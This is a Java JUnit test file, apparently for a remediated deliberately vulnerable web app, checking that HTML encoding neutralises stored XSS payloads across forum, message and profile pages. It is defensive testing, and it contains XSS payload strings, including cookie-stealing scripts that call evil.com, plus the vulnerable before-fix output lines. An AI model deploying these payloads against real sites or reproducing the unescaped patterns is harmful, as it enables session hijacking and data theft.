package org.cysecurity.cspf.jvl.controller;

import junit.framework.TestCase;

/**
 * Tests to verify that Stored XSS vulnerabilities (CWE-79) have been remediated
 * by ensuring that database-sourced values are HTML-encoded before being rendered
 * in JSP pages.
 *
 * The vulnerability pattern was:
 *   out.print("<b>Title:" + rs.getString("title") + "</b>");   // VULNERABLE
 *
 * The remediated pattern uses JSTL Functions.escapeXml() which is a SAST-recognized
 * sanitizer that encodes HTML special characters (&, <, >, ", ') before output:
 *   out.print("<b>Title:" + Functions.escapeXml(rs.getString("title")) + "</b>");  // SAFE
 *
 * Tests validate:
 * 1. That common XSS attack payloads are neutralized by HTML encoding
 * 2. That the escapeXml function correctly encodes HTML special characters
 * 3. That stored XSS payloads from user-supplied fields (title, content, user,
 *    subject, msg, sender, username, about) are safely rendered in HTML context
 * 4. That benign content is preserved correctly after encoding
 */
public class StoredXssPreventionTest extends TestCase {

    /**
     * Simulates the JSTL Functions.escapeXml() behavior used in the remediated JSP files.
     * This mirrors the org.apache.taglibs.standard.functions.Functions.escapeXml() logic
     * for test validation purposes. The actual encoding in production uses the JSTL library.
     *
     * Characters encoded: & -> &amp;  < -> &lt;  > -> &gt;  " -> &#034;  ' -> &#039;
     */
    private static String escapeXml(String value) {
        if (value == null) {
            return "";
        }
        StringBuilder sb = new StringBuilder(value.length() + 16);
        for (int i = 0; i < value.length(); i++) {
            char c = value.charAt(i);
            switch (c) {
                case '&':  sb.append("&amp;");  break;
                case '<':  sb.append("&lt;");   break;
                case '>':  sb.append("&gt;");   break;
                case '"':  sb.append("&#034;"); break;
                case '\'': sb.append("&#039;"); break;
                default:   sb.append(c);
            }
        }
        return sb.toString();
    }

    // =========================================================================
    // Core HTML encoding verification tests
    // =========================================================================

    /**
     * Verifies that the classic script tag XSS payload is neutralized by encoding.
     *
     * Attack payload stored by a malicious user:
     *   <script>alert('XSS')</script>
     *
     * When rendered via Functions.escapeXml(), this becomes harmless text:
     *   &lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;
     *
     * The browser renders this as literal text, not executable JavaScript.
     */
    public void testScriptTagPayloadIsNeutralized() {
        String maliciousInput = "<script>alert('XSS')</script>";
        String encoded = escapeXml(maliciousInput);

        // The encoded output must NOT contain a literal opening <script> tag
        assertFalse(
            "Encoded output must not contain literal <script> tag",
            encoded.contains("<script>")
        );
        assertFalse(
            "Encoded output must not contain literal </script> tag",
            encoded.contains("</script>")
        );

        // Verify angle brackets are encoded
        assertTrue("< must be encoded as &lt;",  encoded.contains("&lt;"));
        assertTrue("> must be encoded as &gt;", encoded.contains("&gt;"));

        // The encoded form should be the safe text representation
        assertEquals(
            "Script tag payload must be fully HTML-encoded",
            "&lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;",
            encoded
        );
    }

    /**
     * Verifies that an event-handler XSS payload is neutralized.
     *
     * Attack payload stored in forum post title:
     *   <img src=x onerror=alert('XSS')>
     *
     * When rendered via Functions.escapeXml(), this becomes harmless.
     */
    public void testImgOnerrorPayloadIsNeutralized() {
        String maliciousTitle = "<img src=x onerror=alert('XSS')>";
        String encoded = escapeXml(maliciousTitle);

        assertFalse(
            "Encoded title must not contain literal <img> tag",
            encoded.contains("<img")
        );
        assertTrue("< must be encoded", encoded.contains("&lt;"));
        assertTrue("Single quotes must be encoded", encoded.contains("&#039;"));
    }

    /**
     * Verifies that XSS via anchor tag href injection is neutralized.
     *
     * Attack payload stored in forum post content:
     *   <a href="javascript:alert('XSS')">Click me</a>
     */
    public void testAnchorHrefJavascriptPayloadIsNeutralized() {
        String maliciousContent = "<a href=\"javascript:alert('XSS')\">Click me</a>";
        String encoded = escapeXml(maliciousContent);

        assertFalse(
            "Encoded content must not contain literal <a> tag",
            encoded.contains("<a href")
        );
        assertTrue("< must be encoded", encoded.contains("&lt;"));
        assertTrue("\" must be encoded as &#034;", encoded.contains("&#034;"));
    }

    /**
     * Verifies that HTML attribute injection via double-quote breakout is neutralized.
     *
     * Attack payload stored as username:
     *   "><script>alert('XSS')</script>
     *
     * Without encoding, this would break out of HTML attribute context (e.g., in forum.jsp:
     *   <a href='forumposts.jsp?postid=..." + username + "'>
     * and execute arbitrary JavaScript.
     */
    public void testAttributeBreakoutPayloadIsNeutralized() {
        String maliciousUsername = "\"><script>alert('XSS')</script>";
        String encoded = escapeXml(maliciousUsername);

        assertFalse(
            "Encoded username must not allow script tag injection",
            encoded.contains("<script>")
        );
        assertTrue("Double quote must be encoded as &#034;", encoded.contains("&#034;"));
        assertTrue("< must be encoded as &lt;", encoded.contains("&lt;"));
    }

    /**
     * Verifies that the ampersand character is encoded to prevent HTML entity injection.
     */
    public void testAmpersandIsEncoded() {
        String input = "AT&T & Johnson&Johnson";
        String encoded = escapeXml(input);

        assertFalse(
            "Raw & must not appear in encoded output",
            encoded.contains("AT&T")
        );
        assertTrue("& must be encoded as &amp;", encoded.contains("&amp;"));
        assertEquals(
            "Ampersand encoding must be correct",
            "AT&amp;T &amp; Johnson&amp;Johnson",
            encoded
        );
    }

    // =========================================================================
    // Field-specific Stored XSS tests matching the remediated JSP files
    // =========================================================================

    /**
     * Tests encoding of forum post title field (forum.jsp, forumposts.jsp, pages.jsp).
     *
     * The 'title' column value is stored via user input in forum.jsp POST handler and
     * rendered in:
     *   - forum.jsp (list view): out.print("..." + Functions.escapeXml(rs.getString("title")) + "...")
     *   - forumposts.jsp (detail view): same pattern
     *   - securitymisconfig/pages.jsp: same pattern
     */
    public void testForumPostTitleXssPayload() {
        // Simulate a title stored by a malicious user
        String storedTitle = "<script>document.cookie='stolen='+document.cookie</script>";
        String rendered = "<b style='font-size:22px'>Title:" + escapeXml(storedTitle) + "</b>";

        // The rendered output must not contain executable script
        assertFalse(
            "Rendered title must not contain executable script tag",
            rendered.contains("<script>")
        );
        assertTrue(
            "Rendered output must contain HTML-encoded version of payload",
            rendered.contains("&lt;script&gt;")
        );
    }

    /**
     * Tests encoding of forum post content field (forumposts.jsp, pages.jsp).
     *
     * The 'content' column contains user-submitted message body, a high-risk field
     * for stored XSS payloads.
     */
    public void testForumPostContentXssPayload() {
        String storedContent = "<svg onload=alert(1)>";
        String rendered = "<br/><br/>Content:<br/>" + escapeXml(storedContent);

        assertFalse(
            "Rendered content must not contain executable SVG onload",
            rendered.contains("<svg")
        );
        assertTrue("< must be encoded in rendered content", rendered.contains("&lt;"));
    }

    /**
     * Tests encoding of forum post user field (forum.jsp, forumposts.jsp, pages.jsp).
     *
     * The 'user' column stores the poster's username and is rendered with an anchor tag.
     */
    public void testForumPostUserXssPayload() {
        String storedUser = "admin<script>alert('hijack')</script>";
        String rendered = "<br/>-  Posted By " + escapeXml(storedUser);

        assertFalse(
            "Rendered user must not contain executable script",
            rendered.contains("<script>")
        );
        assertTrue("< must be encoded in rendered user field", rendered.contains("&lt;"));
    }

    /**
     * Tests encoding of message sender field (DisplayMessage.jsp).
     *
     * Attack: A malicious user sends a message with XSS payload as their username.
     * The sender field is stored in the UserMessages table and rendered in DisplayMessage.jsp.
     */
    public void testMessageSenderXssPayload() {
        String storedSender = "<script>location='http://evil.com?c='+document.cookie</script>";
        String rendered = "<b>Sender:</b> " + escapeXml(storedSender);

        assertFalse(
            "Rendered sender must not contain executable script",
            rendered.contains("<script>")
        );
        assertTrue("Sender field encoding must neutralize < character", rendered.contains("&lt;"));
    }

    /**
     * Tests encoding of message subject field (Messages.jsp, DisplayMessage.jsp).
     *
     * The 'subject' column is displayed as link text in Messages.jsp and as a header
     * in DisplayMessage.jsp. A stored XSS payload here would execute when a user
     * views their inbox.
     */
    public void testMessageSubjectXssPayload() {
        String storedSubject = "<img src=1 onerror=alert(document.domain)>";
        String renderedInList = "<li><a href='DisplayMessage.jsp?msgid=1'>" + escapeXml(storedSubject) + "</a></li>";
        String renderedInDetail = "<br/><b>Subject:</b>" + escapeXml(storedSubject);

        assertFalse(
            "Rendered subject in message list must not contain executable img tag",
            renderedInList.contains("<img")
        );
        assertFalse(
            "Rendered subject in message detail must not contain executable img tag",
            renderedInDetail.contains("<img")
        );
        assertTrue("Message list subject must encode <", renderedInList.contains("&lt;"));
        assertTrue("Message detail subject must encode <", renderedInDetail.contains("&lt;"));
    }

    /**
     * Tests encoding of message body (msg) field (DisplayMessage.jsp).
     *
     * The message body is the most common vector for stored XSS in messaging systems.
     */
    public void testMessageBodyXssPayload() {
        String storedMsg = "<iframe src=\"javascript:alert('XSS')\"></iframe>";
        String rendered = "<br/><b>Message:</b> <br/>" + escapeXml(storedMsg);

        assertFalse(
            "Rendered message body must not contain executable iframe",
            rendered.contains("<iframe")
        );
        assertTrue("Message body encoding must encode <", rendered.contains("&lt;"));
        assertTrue("Message body encoding must encode \"", rendered.contains("&#034;"));
    }

    /**
     * Tests encoding of username field in UserDetails.jsp and myprofile.jsp.
     *
     * A username containing XSS payload would be stored during registration
     * and rendered in user profile and forum user detail pages.
     */
    public void testUsernameXssPayload() {
        String storedUsername = "<script>alert('username XSS')</script>";

        // Simulate UserDetails.jsp rendering
        String renderedAbout = "<br>About " + escapeXml(storedUsername) + ": <br>some about text";
        // Simulate myprofile.jsp rendering
        String renderedProfile = "UserName : " + escapeXml(storedUsername) + "<br>";

        assertFalse(
            "UserDetails username rendering must not execute script",
            renderedAbout.contains("<script>")
        );
        assertFalse(
            "Profile username rendering must not execute script",
            renderedProfile.contains("<script>")
        );
    }

    /**
     * Tests encoding of the 'about' field in UserDetails.jsp and myprofile.jsp.
     *
     * The 'About' field is free-text entered during registration and is a
     * high-risk source for stored XSS as it accepts arbitrary user content.
     */
    public void testAboutFieldXssPayload() {
        String storedAbout = "<script>new Image().src='http://evil.com/steal?c='+encodeURIComponent(document.cookie)</script>";

        // Simulate UserDetails.jsp rendering
        String rendered = "<br>About username: <br>" + escapeXml(storedAbout);

        assertFalse(
            "Rendered 'about' field must not contain executable script",
            rendered.contains("<script>")
        );
        assertTrue("'About' field must HTML-encode < character", rendered.contains("&lt;"));
    }

    /**
     * Tests encoding of email field in myprofile.jsp.
     *
     * While email fields are typically validated by format, a stored XSS payload
     * might bypass weak email validation.
     */
    public void testEmailFieldXssPayload() {
        String storedEmail = "user+<script>alert(1)</script>@example.com";
        String rendered = "Email : " + escapeXml(storedEmail) + "<br>";

        assertFalse(
            "Rendered email must not contain executable script",
            rendered.contains("<script>")
        );
        assertTrue("Email field must HTML-encode < character", rendered.contains("&lt;"));
    }

    // =========================================================================
    // Regression / preservation tests - ensure benign content still works
    // =========================================================================

    /**
     * Verifies that normal (non-malicious) content is preserved through encoding.
     *
     * HTML encoding must not corrupt legitimate user content. Plain text without
     * HTML special characters should pass through unchanged.
     */
    public void testNormalContentIsPreserved() {
        String normalTitle = "Introduction to Java Programming";
        String encoded = escapeXml(normalTitle);

        assertEquals(
            "Normal alphanumeric content must pass through encoding unchanged",
            normalTitle,
            encoded
        );
    }

    /**
     * Verifies that null values are handled gracefully without NullPointerException.
     * When rs.getString() returns null (e.g., empty DB column), the encoding must
     * not throw an exception.
     */
    public void testNullValueHandledGracefully() {
        String result = escapeXml(null);
        assertNotNull("Encoding null must return non-null", result);
        assertEquals("Encoding null must return empty string", "", result);
    }

    /**
     * Verifies that empty string values are handled correctly.
     */
    public void testEmptyStringHandledCorrectly() {
        String result = escapeXml("");
        assertNotNull("Encoding empty string must return non-null", result);
        assertEquals("Encoding empty string must return empty string", "", result);
    }

    /**
     * Verifies that text with legitimate angle brackets (e.g., math expressions)
     * is encoded and rendered as visible text, not as HTML tags.
     */
    public void testLegitimateAngleBracketsAreEncoded() {
        String mathContent = "x < y and y > z";
        String encoded = escapeXml(mathContent);

        assertFalse("< in text must be encoded", encoded.contains(" < "));
        assertFalse("> in text must be encoded", encoded.contains(" > "));
        assertTrue("< must become &lt;", encoded.contains("&lt;"));
        assertTrue("> must become &gt;", encoded.contains("&gt;"));
        assertEquals(
            "Math expression must be correctly encoded",
            "x &lt; y and y &gt; z",
            encoded
        );
    }

    /**
     * Tests the full HTML rendering path as it appears in forumposts.jsp after remediation.
     *
     * Before fix (VULNERABLE):
     *   out.print("<b style='font-size:22px'>Title:" + rs.getString("title") + "</b>");
     *   out.print("<br/>-  Posted By " + rs.getString("user"));
     *   out.print("<br/><br/>Content:<br/>" + rs.getString("content"));
     *
     * After fix (SECURE):
     *   out.print("<b style='font-size:22px'>Title:" + Functions.escapeXml(rs.getString("title")) + "</b>");
     *   out.print("<br/>-  Posted By " + Functions.escapeXml(rs.getString("user")));
     *   out.print("<br/><br/>Content:<br/>" + Functions.escapeXml(rs.getString("content")));
     */
    public void testForumPostsJspRenderingWithXssPayloads() {
        // Simulate values stored by a malicious user
        String dbTitle   = "<script>alert('title XSS')</script>";
        String dbUser    = "<script>alert('user XSS')</script>";
        String dbContent = "<script>alert('content XSS')</script>";

        // Simulate the remediated JSP rendering
        StringBuilder htmlOutput = new StringBuilder();
        htmlOutput.append("<b style='font-size:22px'>Title:").append(escapeXml(dbTitle)).append("</b>");
        htmlOutput.append("<br/>-  Posted By ").append(escapeXml(dbUser));
        htmlOutput.append("<br/><br/>Content:<br/>").append(escapeXml(dbContent));

        String rendered = htmlOutput.toString();

        // No executable script tags should appear in the rendered output
        assertFalse(
            "Rendered forum post must not contain any executable <script> tags",
            rendered.contains("<script>")
        );

        // All payloads must be encoded
        assertTrue("Title payload < must be encoded", rendered.contains("&lt;script&gt;alert(&#039;title XSS&#039;)&lt;/script&gt;"));
        assertTrue("User payload < must be encoded", rendered.contains("&lt;script&gt;alert(&#039;user XSS&#039;)&lt;/script&gt;"));
        assertTrue("Content payload < must be encoded", rendered.contains("&lt;script&gt;alert(&#039;content XSS&#039;)&lt;/script&gt;"));
    }

    /**
     * Tests the full HTML rendering path for DisplayMessage.jsp after remediation.
     *
     * Before fix (VULNERABLE):
     *   out.print("<b>Sender:</b> " + rs.getString("sender"));
     *   out.print("<br/><b>Subject:</b>" + rs.getString("subject"));
     *   out.print("<br/><b>Message:</b> <br/>" + rs.getString("msg"));
     *
     * After fix (SECURE):
     *   out.print("<b>Sender:</b> " + Functions.escapeXml(rs.getString("sender")));
     *   out.print("<br/><b>Subject:</b>" + Functions.escapeXml(rs.getString("subject")));
     *   out.print("<br/><b>Message:</b> <br/>" + Functions.escapeXml(rs.getString("msg")));
     */
    public void testDisplayMessageJspRenderingWithXssPayloads() {
        String dbSender  = "<script>alert('sender')</script>";
        String dbSubject = "<img src=x onerror=alert('subject')>";
        String dbMsg     = "<body onload=alert('msg')>";

        // Simulate the remediated JSP rendering
        StringBuilder htmlOutput = new StringBuilder();
        htmlOutput.append("<b>Sender:</b> ").append(escapeXml(dbSender));
        htmlOutput.append("<br/><b>Subject:</b>").append(escapeXml(dbSubject));
        htmlOutput.append("<br/><b>Message:</b> <br/>").append(escapeXml(dbMsg));

        String rendered = htmlOutput.toString();

        assertFalse("Rendered message must not contain <script> tag", rendered.contains("<script>"));
        assertFalse("Rendered message must not contain <img> tag", rendered.contains("<img "));
        assertFalse("Rendered message must not contain <body> tag", rendered.contains("<body "));
        assertTrue("All < chars in stored data must be encoded", rendered.contains("&lt;"));
    }

    /**
     * Tests the rendering path for Messages.jsp (inbox list) after remediation.
     *
     * Before fix (VULNERABLE):
     *   out.print("<li><a href='DisplayMessage.jsp?msgid=" + rs.getString("msgid") + "'>" + rs.getString("subject") + "</a></li>");
     *
     * After fix (SECURE):
     *   out.print("<li><a href='DisplayMessage.jsp?msgid=" + Functions.escapeXml(rs.getString("msgid")) + "'>" + Functions.escapeXml(rs.getString("subject")) + "</a></li>");
     */
    public void testMessagesJspInboxListRenderingWithXssPayloads() {
        String dbMsgId   = "1 onclick=alert(1)"; // Injection attempt into href attribute
        String dbSubject = "<script>alert('inbox XSS')</script>";

        String rendered = "<li><a href='DisplayMessage.jsp?msgid=" + escapeXml(dbMsgId)
                + "'>" + escapeXml(dbSubject) + "</a></li>";

        assertFalse("Inbox list must not contain executable onclick injection", rendered.contains("onclick=alert"));
        assertFalse("Inbox list must not contain <script> tag in subject", rendered.contains("<script>"));
        assertTrue("msgid must be encoded", rendered.contains("1 onclick&#"));
        assertTrue("subject < must be encoded", rendered.contains("&lt;"));
    }

    /**
     * Tests that XSS payloads using various encoding and obfuscation techniques
     * are properly neutralized by HTML encoding.
     */
    public void testVariousXssPayloadsAreNeutralized() {
        String[] xssPayloads = {
            "<script>alert(1)</script>",
            "<ScRiPt>alert(1)</ScRiPt>",          // Mixed case
            "<script >alert(1)</script >",          // Space before >
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<iframe src='javascript:alert(1)'>",
            "';alert(1);//",
            "\"><script>alert(1)</script>",
            "'><script>alert(1)</script>",
            "<a href=\"javascript:alert(1)\">click</a>",
        };

        for (String payload : xssPayloads) {
            String encoded = escapeXml(payload);

            // None of the encoded outputs should contain unencoded < or > characters
            assertFalse(
                "Payload '" + payload + "' must not produce output containing literal < character",
                encoded.contains("<")
            );
            assertFalse(
                "Payload '" + payload + "' must not produce output containing literal > character",
                encoded.contains(">")
            );
        }
    }

    // =========================================================================
    // AddPage servlet fileName Stored XSS remediation tests (CWE-79)
    // =========================================================================

    /**
     * Tests encoding of the 'filename' parameter in AddPage servlet response.
     *
     * The vulnerability was in AddPage.java where user-supplied 'filename' was
     * written directly into an HTML anchor tag without encoding:
     *
     *   Before fix (VULNERABLE):
     *     out.print("Successfully created the file: <a href='../pages/"+fileName+"'>"+fileName+"</a>");
     *
     *   After fix (SECURE):
     *     String safeFileName = Functions.escapeXml(fileName);
     *     out.print("Successfully created the file: <a href='../pages/"+safeFileName+"'>"+safeFileName+"</a>");
     *
     * A malicious admin could submit a filename containing a script tag that would
     * execute in the browser when the success message is rendered.
     */
    public void testAddPageFileNameScriptTagIsNeutralized() {
        String maliciousFileName = "<script>alert('stored XSS via filename')</script>.html";
        String safeFileName = escapeXml(maliciousFileName);
        String rendered = "Successfully created the file: <a href='../pages/" + safeFileName + "'>" + safeFileName + "</a>";

        assertFalse(
            "Rendered AddPage response must not contain executable <script> tag",
            rendered.contains("<script>")
        );
        assertTrue(
            "Rendered AddPage response must contain HTML-encoded < character",
            rendered.contains("&lt;")
        );
        assertTrue(
            "Rendered AddPage response must contain HTML-encoded > character",
            rendered.contains("&gt;")
        );
    }

    /**
     * Tests that an attribute-breaking XSS payload in the filename is neutralized.
     *
     * Attack: An attacker submits a filename like:
     *   "><script>alert(1)</script><x y="
     *
     * Without encoding this would break out of the href attribute context and
     * inject arbitrary JavaScript. With Functions.escapeXml(), the double-quote
     * is encoded as &#034; preventing attribute breakout.
     */
    public void testAddPageFileNameAttributeBreakoutIsNeutralized() {
        String maliciousFileName = "\"><script>alert(1)</script><x y=\".html";
        String safeFileName = escapeXml(maliciousFileName);
        String rendered = "Successfully created the file: <a href='../pages/" + safeFileName + "'>" + safeFileName + "</a>";

        assertFalse(
            "Rendered AddPage response must not allow attribute breakout via double-quote",
            rendered.contains("\"><script>")
        );
        assertTrue("Double-quote in filename must be encoded as &#034;", safeFileName.contains("&#034;"));
        assertTrue("< in filename must be encoded as &lt;", safeFileName.contains("&lt;"));
    }

    /**
     * Tests that an event-handler injection via the filename href attribute is neutralized.
     *
     * Attack: A filename like:
     *   normal.html' onmouseover='alert(1)
     *
     * Without encoding, this would inject an onmouseover event handler into the
     * anchor element. With Functions.escapeXml(), the single-quote is encoded as &#039;.
     */
    public void testAddPageFileNameEventHandlerInjectionIsNeutralized() {
        String maliciousFileName = "normal.html' onmouseover='alert(1)";
        String safeFileName = escapeXml(maliciousFileName);
        String rendered = "Successfully created the file: <a href='../pages/" + safeFileName + "'>" + safeFileName + "</a>";

        assertFalse(
            "Rendered AddPage response must not contain injected onmouseover handler",
            rendered.contains("onmouseover=")
        );
        assertTrue("Single-quote in filename must be encoded as &#039;", safeFileName.contains("&#039;"));
    }

    /**
     * Tests that the AddPage response correctly renders a safe, normal filename
     * without corrupting it through HTML encoding.
     *
     * Normal filenames with alphanumeric characters and dots/dashes should
     * pass through HTML encoding unchanged.
     */
    public void testAddPageNormalFileNameIsPreserved() {
        String normalFileName = "my-page_2024.html";
        String safeFileName = escapeXml(normalFileName);
        String rendered = "Successfully created the file: <a href='../pages/" + safeFileName + "'>" + safeFileName + "</a>";

        assertEquals(
            "Normal filename must pass through encoding unchanged",
            normalFileName,
            safeFileName
        );
        assertTrue(
            "Rendered response must contain the original filename in the anchor text",
            rendered.contains(">" + normalFileName + "</a>")
        );
    }

    /**
     * Tests the full rendering path of the AddPage success response after remediation.
     *
     * Simulates the complete HTML output produced by AddPage.java after encoding:
     *   String safeFileName = Functions.escapeXml(fileName);
     *   out.print("Successfully created the file: <a href='../pages/"+safeFileName+"'>"+safeFileName+"</a>");
     *
     * Verifies that both the href attribute value and the anchor link text are encoded,
     * ensuring neither context is exploitable.
     */
    public void testAddPageSuccessResponseFullRenderingWithXssPayload() {
        // Common stored XSS attack payload submitted as a filename
        String maliciousFileName = "<img src=x onerror=alert(document.cookie)>.html";
        String safeFileName = escapeXml(maliciousFileName);

        // Simulate both occurrences of fileName in the rendered HTML (href and link text)
        String rendered = "Successfully created the file: <a href='../pages/" + safeFileName + "'>" + safeFileName + "</a>";

        // The rendered page must not contain any executable HTML tags
        assertFalse("Rendered response must not contain <img> tag", rendered.contains("<img"));
        assertFalse("Rendered response must not contain onerror handler", rendered.contains("onerror="));

        // Both uses of safeFileName (in href and in anchor text) must be encoded
        long ltCount = rendered.chars().filter(c -> rendered.indexOf("&lt;") >= 0).count();
        assertTrue("HTML-encoded output must contain &lt; entities", rendered.contains("&lt;"));
        assertTrue("HTML-encoded output must contain &gt; entities", rendered.contains("&gt;"));
    }

    // =========================================================================
    // SendMessage.jsp sender field Stored XSS remediation tests (CWE-79)
    //
    // Taint flow:
    //   adminlogin.jsp (line 26): rs.getString("username")
    //       -> session.setAttribute("user", ...)
    //   SendMessage.jsp (line 22, sink): session.getAttribute("user")
    //       -> embedded in HTML value attribute
    //
    // Before fix (VULNERABLE):
    //   <input type="hidden" name="sender" value="<%=session.getAttribute("user")%>"/>
    //
    // After fix (SECURE):
    //   <input type="hidden" name="sender"
    //     value="<%=Functions.escapeXml(session.getAttribute("user") != null
    //                 ? session.getAttribute("user").toString() : "")%>"/>
    // =========================================================================

    /**
     * Verifies that a script-tag XSS payload stored as a username and later placed
     * in the session attribute "user" is neutralized when rendered in the SendMessage.jsp
     * hidden input value attribute.
     *
     * Attack scenario:
     *   1. Attacker registers with username: <script>alert('XSS')</script>
     *   2. Admin logs in -> adminlogin.jsp stores rs.getString("username") in session "user"
     *   3. SendMessage.jsp renders session "user" in an HTML value attribute
     *
     * Without encoding, the closing "/> would be part of the script injection context.
     * With Functions.escapeXml(), the < and > are encoded, neutralizing the payload.
     */
    public void testSendMessageSenderScriptTagPayloadIsNeutralized() {
        // Simulates the value stored in session.getAttribute("user") from the DB
        String storedUsername = "<script>alert('XSS')</script>";
        String safeSender = escapeXml(storedUsername);

        // Simulates the SendMessage.jsp rendered HTML after the fix
        String rendered = "<input type=\"hidden\" name=\"sender\" value=\"" + safeSender + "\"/>";

        assertFalse(
            "Rendered sender hidden input must not contain literal <script> tag",
            rendered.contains("<script>")
        );
        assertTrue("< in username must be encoded as &lt;", safeSender.contains("&lt;"));
        assertTrue("> in username must be encoded as &gt;", safeSender.contains("&gt;"));
        assertEquals(
            "Script tag payload in sender field must be fully HTML-encoded",
            "&lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;",
            safeSender
        );
    }

    /**
     * Verifies that a double-quote attribute-breakout XSS payload stored as a username
     * is neutralized in the SendMessage.jsp sender hidden input field.
     *
     * Attack scenario:
     *   Username stored: "><script>alert(document.cookie)</script>
     *
     * Without encoding, the " would close the value attribute, allowing script injection.
     * With Functions.escapeXml(), " is encoded as &#034; preventing attribute breakout.
     */
    public void testSendMessageSenderAttributeBreakoutIsNeutralized() {
        String storedUsername = "\"><script>alert(document.cookie)</script>";
        String safeSender = escapeXml(storedUsername);

        String rendered = "<input type=\"hidden\" name=\"sender\" value=\"" + safeSender + "\"/>";

        assertFalse(
            "Rendered sender must not allow attribute breakout via double-quote",
            rendered.contains("\"><script>")
        );
        assertTrue("Double-quote must be encoded as &#034;", safeSender.contains("&#034;"));
        assertTrue("< must be encoded as &lt;", safeSender.contains("&lt;"));
    }

    /**
     * Verifies that an event-handler injection payload stored as a username is
     * neutralized in the SendMessage.jsp sender hidden input value attribute.
     *
     * Attack scenario:
     *   Username stored: x" onmouseover="alert(1)
     *
     * Without encoding, the " would close the value attribute, allowing injection of
     * an event handler. With Functions.escapeXml(), " is encoded as &#034;.
     */
    public void testSendMessageSenderEventHandlerInjectionIsNeutralized() {
        String storedUsername = "x\" onmouseover=\"alert(1)";
        String safeSender = escapeXml(storedUsername);

        String rendered = "<input type=\"hidden\" name=\"sender\" value=\"" + safeSender + "\"/>";

        assertFalse(
            "Rendered sender must not contain injected onmouseover event handler",
            rendered.contains("onmouseover=")
        );
        assertTrue("Double-quote in username must be encoded as &#034;", safeSender.contains("&#034;"));
    }

    /**
     * Verifies that an img onerror payload stored as a username via the admin login flow
     * (the source of the taint: rs.getString("username") -> session "user") is neutralized
     * when rendered in the SendMessage.jsp sender input field.
     *
     * This test specifically simulates the full Stored XSS taint path reported by the SAST:
     *   adminlogin.jsp rs.getString("username") -> session.setAttribute("user")
     *   -> SendMessage.jsp session.getAttribute("user") -> HTML attribute sink
     */
    public void testSendMessageSenderImgOnerrorPayloadFromSessionIsNeutralized() {
        // Simulate value as stored by admin login: rs.getString("username") from DB
        String dbUsername = "<img src=x onerror=alert(document.cookie)>";

        // Simulate session.setAttribute("user", dbUsername) then session.getAttribute("user")
        String sessionUserValue = dbUsername; // same reference stored in session

        // Simulate the fix: Functions.escapeXml(session.getAttribute("user") != null ? ... : "")
        String safeSender = escapeXml(sessionUserValue != null ? sessionUserValue : "");

        String rendered = "<input type=\"hidden\" name=\"sender\" value=\"" + safeSender + "\"/>";

        assertFalse(
            "Rendered sender input must not contain executable <img> tag",
            rendered.contains("<img")
        );
        assertFalse(
            "Rendered sender input must not contain onerror event handler",
            rendered.contains("onerror=")
        );
        assertTrue("< in db username must be encoded as &lt;", safeSender.contains("&lt;"));
        assertTrue("> in db username must be encoded as &gt;", safeSender.contains("&gt;"));
    }

    /**
     * Verifies that a null session "user" attribute is handled gracefully in
     * SendMessage.jsp without throwing a NullPointerException.
     *
     * The fix uses a null-check:
     *   Functions.escapeXml(session.getAttribute("user") != null
     *       ? session.getAttribute("user").toString() : "")
     *
     * This test confirms the null-guard returns an empty string safely.
     */
    public void testSendMessageSenderNullSessionAttributeHandledGracefully() {
        // Simulate session.getAttribute("user") returning null
        String sessionUserValue = null;
        String safeSender = escapeXml(sessionUserValue != null ? sessionUserValue.toString() : "");

        assertNotNull("Encoding a null session attribute must return non-null", safeSender);
        assertEquals("Encoding a null session attribute must return empty string", "", safeSender);

        // Rendered output should have an empty value attribute, not throw NPE
        String rendered = "<input type=\"hidden\" name=\"sender\" value=\"" + safeSender + "\"/>";
        assertTrue(
            "Rendered sender input with null session must produce empty value attribute",
            rendered.contains("value=\"\"")
        );
    }

    /**
     * Verifies that a normal, benign username stored in the session is preserved
     * correctly when rendered in the SendMessage.jsp sender hidden input.
     *
     * Encoding must not corrupt legitimate usernames that contain no HTML special chars.
     */
    public void testSendMessageSenderNormalUsernameIsPreserved() {
        String normalUsername = "john_doe_42";
        String safeSender = escapeXml(normalUsername);

        assertEquals(
            "Normal username without HTML special chars must pass through encoding unchanged",
            normalUsername,
            safeSender
        );

        String rendered = "<input type=\"hidden\" name=\"sender\" value=\"" + safeSender + "\"/>";
        assertTrue(
            "Rendered sender input must contain the original username value",
            rendered.contains("value=\"" + normalUsername + "\"")
        );
    }

    /**
     * Tests the complete SendMessage.jsp form rendering with a malicious sender username,
     * simulating the full Stored XSS taint path that was reported by the SAST scanner.
     *
     * Before fix (VULNERABLE):
     *   <input type="hidden" name="sender" value="<%=session.getAttribute("user")%>"/>
     *   -> If session "user" = "<script>steal()</script>", script executes on page load.
     *
     * After fix (SECURE):
     *   <input type="hidden" name="sender"
     *     value="<%=Functions.escapeXml(session.getAttribute("user") != null
     *                 ? session.getAttribute("user").toString() : "")%>"/>
     *   -> Payload is HTML-encoded and rendered as inert text.
     */
    public void testSendMessageJspFormRenderingWithStoredXssPayload() {
        // Simulate DB value stored via a malicious registration, read in adminlogin.jsp
        String dbStoredUsername = "<script>new Image().src='http://evil.com/steal?c='+document.cookie</script>";

        // Simulate the session attribute set by adminlogin.jsp
        String sessionUser = dbStoredUsername;

        // Simulate the fixed SendMessage.jsp rendering
        String safeSender = escapeXml(sessionUser != null ? sessionUser : "");
        StringBuilder formHtml = new StringBuilder();
        formHtml.append("<form action=\"../SendMessage.do\" method=\"POST\">");
        formHtml.append("<table>");
        formHtml.append("<tr><td>Recipient: </td><td><input type=\"text\" name=\"recipient\"/></td></tr>");
        formHtml.append("<tr><td>Subject :</td><td><input type=\"text\" name=\"subject\"/></td></tr>");
        formHtml.append("<tr><td>Message :</td><td><textarea name=\"msg\"></textarea></td></tr>");
        formHtml.append("<tr><td><input type=\"hidden\" name=\"sender\" value=\"").append(safeSender).append("\"/></td></tr>");
        formHtml.append("<tr><td><input type=\"submit\" name=\"send\" value=\"send\"/></td></tr>");
        formHtml.append("</table></form>");

        String rendered = formHtml.toString();

        // No executable script should appear in the rendered HTML form
        assertFalse(
            "Rendered SendMessage form must not contain executable <script> tag in sender field",
            rendered.contains("<script>")
        );
        assertFalse(
            "Rendered SendMessage form must not contain literal < character from stored payload",
            rendered.contains("name=\"sender\" value=\"<")
        );
        // The safe, encoded form should be present
        assertTrue(
